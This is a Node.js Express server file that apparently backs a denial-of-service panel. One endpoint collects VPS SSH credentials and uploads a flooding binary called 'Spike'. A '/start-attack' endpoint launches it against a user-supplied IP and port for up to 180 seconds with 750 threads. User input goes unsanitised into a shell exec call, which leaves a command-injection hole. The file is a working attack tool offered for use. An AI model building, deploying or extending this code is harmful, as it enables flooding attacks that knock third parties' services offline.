const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { exec } = require('child_process');
const Client = require('ssh2').Client;

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Root route
app.get('/', (req, res) => {
    res.send('Backend is running!');
});

let isVPSSetup = false;
const PACKET_SIZE = 1024; // Predefined packet size
const THREADS = 750; // Predefined threads
const BINARY_NAME = 'Spike'; // Binary name

// Endpoint to set up VPS
app.post('/setup-vps', (req, res) => {
    const { ip, username, password } = req.body;

    if (!ip || !username || !password) {
        return res.status(400).json({ message: 'IP, username, and password are required!' });
    }

    const conn = new Client();
    conn.on('ready', () => {
        console.log('SSH Connection Established');
        isVPSSetup = true;
        res.status(200).json({ message: 'VPS set up successfully!' });

        // Upload binary file (example)
        conn.sftp((err, sftp) => {
            if (err) {
                console.error('SFTP Error:', err);
                return;
            }
            // Replace with your binary file path
            sftp.fastPut(`./${BINARY_NAME}`, `./${BINARY_NAME}`, (err) => {
                if (err) {
                    console.error('File Upload Error:', err);
                } else {
                    console.log('Binary file uploaded successfully!');
                }
                conn.end();
            });
        });
    }).on('error', (err) => {
        console.error('SSH Connection Error:', err);
        res.status(500).json({ message: 'Failed to connect to VPS!' });
    }).connect({
        host: ip,
        port: 22,
        username: username,
        password: password,
    });
});

// Endpoint to start attack
app.post('/start-attack', (req, res) => {
    const { ip, port, duration } = req.body;

    if (!isVPSSetup) {
        return res.status(400).json({ message: 'VPS not set up!' });
    }

    if (!ip || !port || !duration) {
        return res.status(400).json({ message: 'IP, port, and duration are required!' });
    }

    if (duration > 180) {
        return res.status(400).json({ message: 'Duration must be 180 seconds or less!' });
    }

    // Execute the binary with predefined packet_size and threads
    const command = `./${BINARY_NAME} ${ip} ${port} ${duration} ${PACKET_SIZE} ${THREADS}`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error('Error executing binary:', error);
            return res.status(500).json({ message: 'Attack failed!' });
        }
        console.log('Binary output:', stdout);
        res.status(200).json({ message: 'Attack finished!' });
    });
});

const PORT = process.env.PORT || 3000; // Use Render's PORT or default to 3000
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
